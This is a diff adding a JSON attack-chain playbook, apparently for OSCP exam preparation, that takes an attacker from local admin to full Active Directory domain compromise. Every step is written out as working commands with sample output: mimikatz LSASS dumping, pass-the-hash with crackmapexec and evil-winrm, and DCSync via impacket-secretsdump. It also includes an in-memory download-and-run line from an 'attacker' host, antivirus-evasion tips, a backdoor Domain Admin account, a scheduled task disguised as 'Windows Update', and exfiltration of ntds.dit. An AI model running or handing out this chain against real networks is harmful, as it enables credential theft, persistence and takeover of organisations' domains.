@@ -1,0 +1,209 @@
+{
+  "id": "ad-pth-to-dcsync-escalation",
+  "name": "Pass-the-Hash to DCSync Full Domain Compromise",
+  "description": "Complete privilege escalation chain from NTLM hash extraction to full domain compromise via DCSync, WITHOUT password cracking.\n\nThis chain demonstrates the CRITICAL OSCP concept: You don't need plaintext passwords for domain compromise - NTLM hashes are sufficient. The complete attack flow: compromised system → mimikatz credential dump → extract NTLM hashes → Pass-the-Hash validation → DCSync to extract ALL domain credentials → Pass-the-Hash to Domain Controller → full domain compromise.\n\nWHY THIS MATTERS: Password cracking takes HOURS (hashcat with rockyou.txt = 30-120 minutes per hash). Pass-the-Hash takes SECONDS. In OSCP exam, you have 24 hours for 3 machines - every minute counts. This chain gets you from local admin to Domain Admin in 15 minutes WITHOUT waiting for password cracks.\n\nCRITICAL PATTERN: This chain connects THREE techniques:\n1. Credential Harvesting (mimikatz) - Extract NTLM hashes from compromised system\n2. Pass-the-Hash (crackmapexec, evil-winrm) - Authenticate using hash instead of password\n3. DCSync (impacket-secretsdump) - Extract ALL domain hashes using replication rights\n\nSUCCESS RATE: Very high in AD environments (80-90%) IF you have local admin on domain-joined system. The chain works because:\n- Windows accepts NTLM hashes for authentication (no plaintext needed)\n- Domain Admins frequently have cached credentials on workstations\n- DCSync uses legitimate replication protocol (hard to detect)\n- Administrator account exists in every domain (guaranteed target)\n\nLESSON FROM CORP-DCSYNC WRITEUP: 'Pass-the-Hash works without plaintext passwords - faster than cracking. No password cracking needed - PTH sufficient for domain compromise.'",
+  "version": "1.0.0",
+  "metadata": {
+    "author": "CRACK Development Team - OSCP Track",
+    "created": "2025-11-25",
+    "updated": "2025-11-25",
+    "tags": [
+      "OSCP:HIGH",
+      "ACTIVE_DIRECTORY",
+      "PRIVILEGE_ESCALATION",
+      "CREDENTIAL_ACCESS",
+      "PASS_THE_HASH",
+      "DCSYNC",
+      "DOMAIN_COMPROMISE"
+    ],
+    "category": "privilege-escalation",
+    "platform": "active-directory",
+    "references": [
+      "https://attack.mitre.org/techniques/T1003/006/",
+      "https://attack.mitre.org/techniques/T1550/002/",
+      "https://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/",
+      "https://github.com/gentilkiwi/mimikatz",
+      "https://github.com/fortra/impacket"
+    ]
+  },
+  "difficulty": "intermediate",
+  "time_estimate": "15 minutes (5 min credential harvest, 3 min DCSync, 2 min DC access, 5 min flag retrieval)",
+  "oscp_relevant": true,
+  "prerequisites": [
+    "Local administrator access on domain-joined Windows system",
+    "Mimikatz binary or ability to execute credential dump",
+    "Network access to Domain Controller",
+    "Understanding of NTLM authentication and DCSync attack",
+    "Knowledge of domain structure (domain name, DC hostname/IP)"
+  ],
+  "notes": "This chain is FASTER than password cracking and MORE RELIABLE than exploit attempts. It leverages Windows built-in authentication (NTLM) and AD replication protocol (DCSync) - both are legitimate features, making detection difficult.\n\nCRITICAL SUCCESS FACTORS:\n1. Mimikatz privilege::debug BEFORE sekurlsa commands (mandatory)\n2. Extract NTLM hash correctly (32 hex characters)\n3. Validate hash with crackmapexec BEFORE attempting DCSync\n4. Use correct syntax for Pass-the-Hash tools (: prefix for impacket, -H flag for evil-winrm)\n5. Target correct Domain Controller (check with 'nltest /dclist:DOMAIN')\n\nCOMMON FAILURES:\n- Mimikatz without privilege::debug: ERROR 0x00000005 Access Denied\n- Wrong hash format: Ensure NTLM (32 chars), not LM or SHA1\n- DCSync requires DA privileges: Validate credentials are Domain Admin BEFORE attempting\n- Network connectivity: Ensure routing to DC (check with ping, test SMB with crackmapexec)\n- Impacket syntax errors: Hash format is ':<NTLM>' (colon prefix), not standalone hash\n\nALTERNATIVES IF CHAIN FAILS:\n- No DA credentials cached: Target more systems, use Kerberoasting for service accounts\n- DCSync blocked by firewall: Use alternative exfiltration (volume shadow copy, ntdsutil)\n- AV blocks mimikatz: Use pypykatz, Invoke-Mimikatz, or procdump+offline parsing\n- Domain Admin disabled: Target Enterprise Admins or Backup Operators (also have replication rights)\n\nTIME ESTIMATES FOR OSCP:\n- Mimikatz upload and credential dump: 5 minutes\n- Parse output and extract NTLM hashes: 2 minutes\n- Validate hash with crackmapexec: 1 minute\n- DCSync execution: 3 minutes (depends on domain size)\n- Extract Administrator hash from DCSync output: 2 minutes\n- Pass-the-Hash to DC and flag retrieval: 2 minutes\n- TOTAL: 15 minutes from local admin to domain compromise\n\nWHY PASS-THE-HASH WORKS:\n- Windows NTLM authentication: Hash IS the password (challenge-response protocol)\n- Server never sees plaintext password (only hash)\n- Pass-the-Hash tools (impacket, evil-winrm) implement NTLM authentication correctly\n- No password cracking needed (saves hours of computation time)\n\nWHY DCSYNC WORKS:\n- Simulates Domain Controller replication protocol (MS-DRSR)\n- Domain Admins have 'Replicating Directory Changes All' permission by default\n- DC treats request as legitimate replication (hard to detect without SIEM)\n- Returns NTLM hashes for ALL domain users (including Administrator, krbtgt)",
+  "steps": [
+    {
+      "id": "harvest-credentials",
+      "name": "Harvest Credentials from Compromised System",
+      "objective": "Extract NTLM hashes from LSASS memory using mimikatz on compromised system with local admin",
+      "description": "Use mimikatz to dump all cached credentials from LSASS memory on the compromised system. This step assumes you already have local administrator access on a domain-joined Windows system.\n\nPrerequisites Check:\n1. Confirm local admin: whoami /groups (look for BUILTIN\\Administrators)\n2. Confirm domain-joined: systeminfo | findstr /B /C:\"Domain\" (should show domain name, not WORKGROUP)\n3. Upload mimikatz.exe to writable directory (C:\\temp, C:\\Users\\Public)\n\nMimikatz Execution:\n1. Enable debug privilege: .\\mimikatz.exe \"privilege::debug\" \"exit\"\n2. Verify output: 'Privilege '20' OK' (mandatory for LSASS access)\n3. Dump credentials: .\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > creds.txt\n4. Wait 5-10 seconds for dump to complete\n5. Review output: type creds.txt | more\n\nExpected Output Structure:\nAuthentication Id : 0 ; 123456\nSession           : Interactive from 2 (or Service from 0, RemoteInteractive from 10)\nUser Name         : administrator\nDomain            : CORP\nLogon Server      : DC01\nLogon Time        : 11/24/2025 10:30:15 AM\nSID               : S-1-5-21-...\n        msv :\n         [00000003] Primary\n         * Username : administrator\n         * Domain   : CORP\n         * NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n         * SHA1     : ...\n\nKey Extraction Points:\n- NTLM hash: 32 hexadecimal characters (this is what we need for PTH)\n- Username: May be administrator, or other privileged accounts (svc_admin, it_admin, etc.)\n- Domain: Confirms domain context (not local account)\n- Session type: Service sessions persist longer (preferred targets)\n\nTroubleshooting:\n- ERROR 0x00000005: Forgot privilege::debug step, run again with privilege::debug\n- No output/empty NTLM: WDigest disabled (Windows 8.1+), target older systems or use Kerberos tickets\n- Only computer accounts: No user sessions cached, try different system or wait for user login\n- AV quarantines mimikatz: Use obfuscated version, Invoke-Mimikatz (in-memory), or procdump+pypykatz\n\nAlternative Methods:\n- pypykatz: lsadump.py (Python alternative, no binary upload)\n- procdump + offline parsing: procdump -ma lsass.exe lsass.dmp && pypykatz lsa minidump lsass.dmp\n- Invoke-Mimikatz: IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1'); Invoke-Mimikatz",
+      "command_ref": "mimikatz-sekurlsa-logonpasswords",
+      "evidence": [
+        "Mimikatz output file containing credentials",
+        "NTLM hashes extracted (32 hex characters)",
+        "Usernames and domains identified",
+        "Confirmation of privilege::debug success"
+      ],
+      "dependencies": [],
+      "repeatable": true,
+      "success_criteria": [
+        "Mimikatz executes without errors",
+        "privilege::debug returns 'Privilege '20' OK'",
+        "Output contains NTLM hashes (at least 1-5 cached credentials)",
+        "Identified domain user accounts (not just computer accounts)"
+      ],
+      "failure_conditions": [
+        "Privilege::debug fails: Not local admin, or UAC blocking (get SYSTEM shell with PSExec)",
+        "No credentials cached: System recently rebooted, wait for user logins or target different system",
+        "AV blocks mimikatz: Use alternative methods (pypykatz, Invoke-Mimikatz, procdump)",
+        "Empty NTLM fields: WDigest disabled, use Kerberos tickets (sekurlsa::tickets)"
+      ],
+      "next_steps": ["extract-ntlm-hashes"]
+    },
+    {
+      "id": "extract-ntlm-hashes",
+      "name": "Extract and Parse NTLM Hashes",
+      "objective": "Parse mimikatz output to extract NTLM hashes and map to usernames, prioritizing Domain Admin accounts",
+      "description": "Parse the mimikatz output to extract NTLM hashes in correct format for Pass-the-Hash tools, and identify which accounts are Domain Admins.\n\nParsing Process:\n1. Open creds.txt (mimikatz output from step 1)\n2. Search for 'NTLM     :' lines\n3. Extract hash (32 hex characters after 'NTLM     : ')\n4. Extract corresponding Username and Domain from same section\n5. Build credential list: DOMAIN\\username:NTLMhash\n\nExample Parsing:\nInput (mimikatz output):\n```\n* Username : administrator\n* Domain   : CORP\n* NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n```\n\nParsed Output:\nCORP\\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n\nAutomated Parsing (Linux):\ngrep -A 5 \"Username\" creds.txt | grep -E \"Username|Domain|NTLM\" > parsed.txt\n\nPrioritization Strategy:\n1. Identify Domain Admins: net group \"Domain Admins\" /domain (run on compromised system)\n2. Cross-reference extracted usernames with Domain Admins list\n3. Priority order:\n   - Administrator (built-in Domain Admin, exists in every domain)\n   - Domain Admin group members\n   - Enterprise Admins (higher privileges, multi-domain)\n   - IT/helpdesk accounts (often over-privileged)\n   - Service accounts (svc_*, sql_*, backup_*)\n4. Start with highest privilege accounts first\n\nHash Format Validation:\n- NTLM hash: EXACTLY 32 hexadecimal characters (0-9, a-f)\n- Example valid hash: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n- Invalid formats:\n  - 40 characters = SHA1 (wrong type)\n  - 16 characters = Half LM hash (incomplete)\n  - 64 characters = SHA256 (wrong type)\n  - Contains non-hex characters (corrupted)\n\nCommon Findings:\n- 5-15 cached credentials on typical workstation\n- At least 1-2 Domain Admin accounts (if workstation active)\n- Computer accounts (HOSTNAME$) - ignore these for PTH\n- Local accounts (domain = hostname) - ignore these, focus on DOMAIN\\user\n\nTroubleshooting:\n- Multiple entries for same user: Use most recent (check Logon Time)\n- No Domain Admin accounts: Target more systems, check servers instead of workstations\n- Hash extraction fails: Manually copy from mimikatz output, ensure no whitespace\n- Unsure if account is DA: Validate with crackmapexec in next step",
+      "command_ref": null,
+      "evidence": [
+        "Parsed list of credentials in DOMAIN\\user:hash format",
+        "Domain Admins group membership list",
+        "Prioritized credential list with DA accounts highlighted",
+        "Hash format validated (32 hex characters)"
+      ],
+      "dependencies": ["harvest-credentials"],
+      "repeatable": true,
+      "success_criteria": [
+        "Extracted at least 3-5 NTLM hashes",
+        "Hashes validated as correct format (32 hex chars)",
+        "Mapped usernames to domains",
+        "Identified at least 1 potential Domain Admin account"
+      ],
+      "failure_conditions": [
+        "No hashes extracted: Mimikatz output empty or corrupted, re-run step 1",
+        "Hash format invalid: Check for whitespace, ensure complete 32 characters",
+        "No Domain Admin accounts: Proceed anyway, validate in next step"
+      ],
+      "next_steps": ["validate-pth"]
+    },
+    {
+      "id": "validate-pth",
+      "name": "Validate Pass-the-Hash Credentials",
+      "objective": "Test extracted NTLM hashes against Domain Controller to confirm they work and identify Domain Admin access",
+      "description": "Use crackmapexec to validate extracted NTLM hashes work for domain authentication and confirm Domain Admin privileges.\n\nValidation Command:\ncrackmapexec smb <DC_IP> -u <username> -H <NTLM_hash> -d <DOMAIN>\n\nExample:\ncrackmapexec smb 10.10.10.10 -u administrator -H a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 -d CORP\n\nExpected Output (Success):\nSMB         10.10.10.10     445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:CORP) (signing:True) (SMBv1:False)\nSMB         10.10.10.10     445    DC01             [+] CORP\\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 (Pwn3d!)\n\nKey Indicators:\n- [+] = Authentication successful\n- (Pwn3d!) = Domain Admin privileges confirmed (can write to C$ share on DC)\n- If no (Pwn3d!): Valid credentials but NOT Domain Admin, test on other systems\n\nFind Domain Controller:\nIf DC IP unknown:\n1. From compromised system: nltest /dclist:CORP\n2. Alternative: nslookup -type=SRV _ldap._tcp.dc._msdcs.CORP.LOCAL\n3. Alternative: nmap -p 88,389,636 10.10.10.0/24 (look for Kerberos + LDAP)\n4. Get DC IP from mimikatz output (Logon Server field)\n\nTest Multiple Credentials:\nCreate credential list file:\n```\nadministrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\nit_admin:b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1\nsvc_backup:c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2\n```\n\nBatch test:\nfor cred in $(cat creds.txt); do\n  user=$(echo $cred | cut -d':' -f1)\n  hash=$(echo $cred | cut -d':' -f2)\n  crackmapexec smb <DC_IP> -u $user -H $hash -d CORP\ndone\n\nValidation Criteria:\n1. Authentication successful ([+])\n2. Pwn3d indicator present (confirms DA)\n3. SMB signing status noted (affects some attacks)\n4. DC hostname and OS version identified\n\nTroubleshooting:\n- Connection timeout: Check network routing, firewall rules, DC online status\n- Authentication failed [-]: Hash incorrect, account disabled, or account expired\n- [+] but no Pwn3d: Valid user but NOT Domain Admin, can still use for lateral movement\n- Account lockout: Test 1 credential at a time, wait between attempts\n- SMB signing required: Doesn't affect PTH, but affects relay attacks\n\nWhat if NO Domain Admin found:\n1. Target more systems (servers more likely to have DA sessions)\n2. Use Kerberoasting for service accounts\n3. Check for Enterprise Admins (higher privileges)\n4. Look for Backup Operators (have replication rights like DAs)\n5. Proceed with standard user, attempt privilege escalation on DC\n\nSuccess: At least 1 credential validates with Pwn3d indicator → proceed to DCSync",
+      "command_ref": "crackmapexec-smb-pth",
+      "evidence": [
+        "Crackmapexec output showing successful authentication",
+        "Pwn3d indicator confirming Domain Admin privileges",
+        "DC hostname and IP confirmed",
+        "Working Domain Admin credentials identified"
+      ],
+      "dependencies": ["extract-ntlm-hashes"],
+      "repeatable": true,
+      "success_criteria": [
+        "At least 1 credential validates successfully ([+])",
+        "Pwn3d indicator present (confirms Domain Admin)",
+        "DC identified and accessible",
+        "Credentials work for domain authentication"
+      ],
+      "failure_conditions": [
+        "All credentials fail: Hashes may be stale, accounts disabled, or wrong domain",
+        "No Pwn3d indicator: Valid users but not Domain Admins, target more systems",
+        "DC unreachable: Check network routing, try alternative DC",
+        "Account lockout triggered: Wait 30 minutes, resume testing"
+      ],
+      "next_steps": ["dcsync-execution"]
+    },
+    {
+      "id": "dcsync-execution",
+      "name": "Execute DCSync to Dump All Domain Credentials",
+      "objective": "Use validated Domain Admin credentials to perform DCSync attack and extract ALL domain user hashes",
+      "description": "Use impacket-secretsdump with Pass-the-Hash to perform DCSync attack, which simulates domain controller replication to extract all domain user NTLM hashes.\n\nDCSync Command:\nimpacket-secretsdump -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<DC_IP>\n\nExample:\nimpacket-secretsdump -hashes :a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 CORP/administrator@10.10.10.10\n\nIMPORTANT SYNTAX:\n- Hash format: ':<NTLM>' (colon prefix, no LM hash)\n- Domain/user format: 'DOMAIN/username' (forward slash)\n- Target: DC IP or hostname\n- No spaces around colon in hash parameter\n\nExpected Output:\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Service RemoteRegistry is in stopped state\n[*] Starting service RemoteRegistry\n[*] Target system bootKey: 0x1234567890abcdef1234567890abcdef\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Searching for pekList, be patient\n[*] PEK # 0 found and decrypted: abcdef1234567890abcdef1234567890\n[*] Reading and decrypting hashes from ntds.dit\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6:::\nguest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1:::\nCORP.LOCAL\\user1:1104:aad3b435b51404eeaad3b435b51404ee:c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2:::\n[... continues for all domain users ...]\n\nOutput Parsing:\nFormat: username:RID:LM_hash:NTLM_hash:::\n- username: Domain user account\n- RID: Relative Identifier (500 = Administrator, 502 = krbtgt)\n- LM_hash: Legacy hash (usually aad3b435... = empty/disabled)\n- NTLM_hash: This is what we need for Pass-the-Hash\n\nKey Targets in Output:\n1. Administrator (RID 500): Built-in domain admin, always exists\n2. krbtgt (RID 502): Used for Golden Ticket creation (persistence)\n3. Domain Admin members: Check 'net group \"Domain Admins\" /domain' output\n4. Service accounts: svc_*, sql_*, backup_* (often reused passwords)\n\nSave Output:\nimpacket-secretsdump -hashes :a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 CORP/administrator@10.10.10.10 > domain_hashes.txt\n\nExecution Time:\n- Small domain (< 100 users): 1-2 minutes\n- Medium domain (100-1000 users): 3-5 minutes\n- Large domain (> 1000 users): 5-10 minutes\n\nTroubleshooting:\n- 'STATUS_ACCESS_DENIED': Credentials not Domain Admin, revalidate in step 3\n- Connection timeout: Check network, try alternative DC\n- 'RemoteRegistry service failed': May still work, wait for full execution\n- Partial output: Network interruption, re-run command\n- 'Clock skew too great': Sync attacker time with domain (ntpdate <DC_IP>)\n\nWHY THIS WORKS:\n- DCSync uses MS-DRSR protocol (legitimate replication)\n- Domain Admins have 'Replicating Directory Changes All' right by default\n- DC treats request as legitimate replication from another DC\n- Returns NTLM hashes for ALL domain users (even non-DA accounts)\n- Stealth: Appears as normal replication in logs (hard to detect without SIEM)\n\nSuccess: Complete list of domain hashes saved to file, proceed to extract Administrator hash",
+      "command_ref": "impacket-secretsdump-dcsync",
+      "evidence": [
+        "Secretsdump output with all domain hashes",
+        "Administrator hash extracted (RID 500)",
+        "krbtgt hash extracted (RID 502)",
+        "Complete domain credential dump saved to file"
+      ],
+      "dependencies": ["validate-pth"],
+      "repeatable": true,
+      "success_criteria": [
+        "Secretsdump completes without errors",
+        "Output contains Administrator hash",
+        "Output contains krbtgt hash",
+        "All domain users hashes extracted"
+      ],
+      "failure_conditions": [
+        "ACCESS_DENIED: Credentials not Domain Admin, verify with crackmapexec",
+        "Connection fails: Check network routing, firewall, DC accessibility",
+        "Partial output: Network interruption, re-run command",
+        "Clock skew: Sync time with ntpdate"
+      ],
+      "next_steps": ["extract-administrator-hash"]
+    },
+    {
+      "id": "extract-administrator-hash",
+      "name": "Extract Administrator Hash from DCSync Output",
+      "objective": "Parse DCSync output to extract Administrator NTLM hash for Domain Controller access",
+      "description": "Parse the secretsdump output to extract the Administrator account NTLM hash, which will be used for Pass-the-Hash access to the Domain Controller.\n\nParsing Process:\n1. Open domain_hashes.txt (secretsdump output from step 4)\n2. Search for line starting with 'Administrator:500:'\n3. Extract NTLM hash (4th field, after third colon)\n\nExample Line:\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6:::\n\nFields breakdown:\n- Administrator: Username\n- 500: RID (Relative Identifier, 500 is always built-in Administrator)\n- aad3b435b51404eeaad3b435b51404ee: LM hash (empty/disabled, ignore this)\n- a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6: NTLM hash (THIS IS WHAT WE NEED)\n\nExtraction Methods:\n\nManual:\ngrep \"Administrator:500:\" domain_hashes.txt\nCopy 4th field (NTLM hash)\n\nAutomated (bash):\ngrep \"Administrator:500:\" domain_hashes.txt | cut -d':' -f4\n\nAutomated (python):\npython3 -c \"import sys; line = [l for l in open('domain_hashes.txt') if 'Administrator:500:' in l][0]; print(line.split(':')[3])\"\n\nValidation:\n- Hash is exactly 32 hexadecimal characters\n- Hash is NOT 'aad3b435b51404ee...' (that's the empty LM hash)\n- Hash is NOT '31d6cfe0d16ae931b73c59d7e0c089c0' (that's empty password hash)\n\nAdditional Hashes to Extract:\n1. krbtgt (RID 502): For Golden Ticket creation (persistence)\n2. Domain Admin members: For alternative access\n3. Service accounts: For additional persistence\n\nExample extraction script:\n```bash\n#!/bin/bash\necho \"[+] Extracting key hashes from DCSync output\"\necho \"\"\necho \"[*] Administrator hash:\"\ngrep \"Administrator:500:\" domain_hashes.txt | cut -d':' -f4\necho \"\"\necho \"[*] krbtgt hash (for Golden Ticket):\"\ngrep \"krbtgt:502:\" domain_hashes.txt | cut -d':' -f4\necho \"\"\necho \"[*] All Domain Admins:\"\nfor user in $(net group \"Domain Admins\" /domain | grep -v \"^The command\" | grep -v \"^Domain Admins\" | grep -v \"^-\" | grep -v \"^$\"); do\n  grep -i \"^$user:\" domain_hashes.txt | cut -d':' -f1,4\ndone\n```\n\nSave Extracted Hash:\necho \"Administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\" > admin_hash.txt\n\nTroubleshooting:\n- Multiple Administrator entries: Use RID 500 (built-in), ignore renamed accounts\n- Hash is empty password hash: Account has blank password, still works for PTH\n- Can't find Administrator: Try alternative names (admin, administrator.domain)\n- File encoding issues: Use 'cat -A' to check for hidden characters\n\nSuccess: Administrator NTLM hash extracted and validated → proceed to DC access",
+      "command_ref": null,
+      "evidence": [
+        "Administrator NTLM hash extracted (32 hex characters)",
+        "krbtgt hash extracted (for Golden Ticket)",
+        "Hash validated as correct format",
+        "Saved to file for next step"
+      ],
+      "dependencies": ["dcsync-execution"],
+      "repeatable": true,
+      "success_criteria": [
+        "Administrator hash extracted successfully",
+        "Hash format validated (32 hex chars)",
+        "Hash is NOT empty password hash or LM hash",
+        "Hash saved for next step"
+      ],
+      "failure_conditions": [
+        "Can't find Administrator: Search for alternative names or check DCSync output completeness",
+        "Hash is empty/invalid: Re-run DCSync, check for network interruption",
+        "File parsing errors: Check encoding with 'file domain_hashes.txt'"
+      ],
+      "next_steps": ["pth-to-dc"]
+    },
+    {
+      "id": "pth-to-dc",
+      "name": "Pass-the-Hash to Domain Controller",
+      "objective": "Use extracted Administrator hash to access Domain Controller and retrieve proof of domain compromise",
+      "description": "Use Pass-the-Hash with extracted Administrator hash to access the Domain Controller and retrieve flags/proof of compromise.\n\nAccess Methods:\n\n1. Evil-WinRM (Preferred for interactive shell):\nevil-winrm -i <DC_IP> -u Administrator -H <NTLM_HASH>\n\nExample:\nevil-winrm -i 10.10.10.10 -u Administrator -H a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n\n2. PSExec (For SYSTEM shell):\nimpacket-psexec -hashes :<NTLM_HASH> Administrator@<DC_IP>\n\nExample:\nimpacket-psexec -hashes :a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 Administrator@10.10.10.10\n\n3. WMIExec (Stealthier, no service creation):\nimpacket-wmiexec -hashes :<NTLM_HASH> Administrator@<DC_IP>\n\n4. SMBExec (Alternative):\nimpacket-smbexec -hashes :<NTLM_HASH> Administrator@<DC_IP>\n\nVerification Steps:\n1. Confirm successful authentication (prompt appears)\n2. Verify user: whoami (should be DOMAIN\\Administrator or NT AUTHORITY\\SYSTEM)\n3. Verify DC: hostname (should match DC hostname)\n4. Confirm domain rights: net group \"Domain Admins\" /domain (verify membership)\n\nFlag Retrieval:\n1. Navigate to typical flag locations:\n   - C:\\Users\\Administrator\\Desktop\\proof.txt\n   - C:\\Users\\Administrator\\Desktop\\flag.txt\n   - C:\\Users\\Administrator\\Desktop\\root.txt\n   - C:\\root.txt\n2. Read flag: type C:\\Users\\Administrator\\Desktop\\proof.txt\n3. Document access:\n   whoami /all > C:\\temp\\proof_of_access.txt\n   systeminfo >> C:\\temp\\proof_of_access.txt\n   ipconfig /all >> C:\\temp\\proof_of_access.txt\n4. Download proof: download C:\\temp\\proof_of_access.txt (Evil-WinRM)\n\nPost-Exploitation Actions:\n\n1. Create Persistence:\n   - Golden Ticket: Use krbtgt hash from step 5\n   - Create backdoor DA: net user backdoor Password123! /add /domain && net group \"Domain Admins\" backdoor /add /domain\n   - Schedule task: schtasks /create /tn \"Windows Update\" /tr \"C:\\temp\\backdoor.exe\" /sc onstart /ru SYSTEM\n\n2. Additional Enumeration:\n   - List all DAs: net group \"Domain Admins\" /domain\n   - List all computers: net group \"Domain Computers\" /domain\n   - List all users: net user /domain\n   - Forest information: nltest /domain_trusts\n\n3. Data Exfiltration:\n   - AD database: Copy C:\\Windows\\NTDS\\ntds.dit (requires volume shadow copy)\n   - SYSVOL: Copy \\\\<DC>\\SYSVOL (Group Policy, scripts)\n   - Registry hives: reg save HKLM\\SAM C:\\temp\\sam.hive\n\n4. Lateral Movement:\n   - Use Administrator hash for Pass-the-Hash to ALL domain computers\n   - Access all C$ shares: dir \\\\<hostname>\\C$\n   - Execute commands remotely: wmic /node:<hostname> process call create \"cmd.exe /c whoami\"\n\nTroubleshooting:\n- Connection refused: Check WinRM/SMB ports (5985, 5986, 445)\n- Authentication fails: Verify hash correctness, check account status\n- Access denied to flags: Check alternative locations, verify user privileges\n- DC unreachable: Check network routing, firewall rules, DC online status\n\nTimeline Documentation:\n- Initial foothold: [timestamp]\n- Local admin on workstation: [timestamp]\n- Credential harvest: [timestamp]\n- DCSync execution: [timestamp]\n- Domain Admin on DC: [timestamp]\n- Total time: X minutes\n\nSUCCESS: You've achieved complete domain compromise using Pass-the-Hash and DCSync, WITHOUT cracking a single password!",
+      "command_ref": "evil-winrm-pth-connect",
+      "evidence": [
+        "Interactive session on Domain Controller",
+        "Flag contents from proof.txt",
+        "whoami /all output showing Administrator privileges",
+        "systeminfo showing Domain Controller role",
+        "Complete domain compromise achieved"
+      ],
+      "dependencies": ["extract-administrator-hash"],
+      "repeatable": false,
+      "success_criteria": [
+        "Successfully authenticated to Domain Controller",
+        "Confirmed Administrator or SYSTEM privileges",
+        "Flag retrieved and documented",
+        "Proof of compromise generated (whoami /all, systeminfo)"
+      ],
+      "failure_conditions": [
+        "DC unreachable: Check network, try alternative DC in domain",
+        "Authentication fails: Verify hash correctness with crackmapexec first",
+        "No flags found: Check alternative locations, verify DC role",
+        "WinRM not enabled: Use PSExec or WMIExec instead"
+      ],
+      "next_steps": []
+    }
+  ]
+}
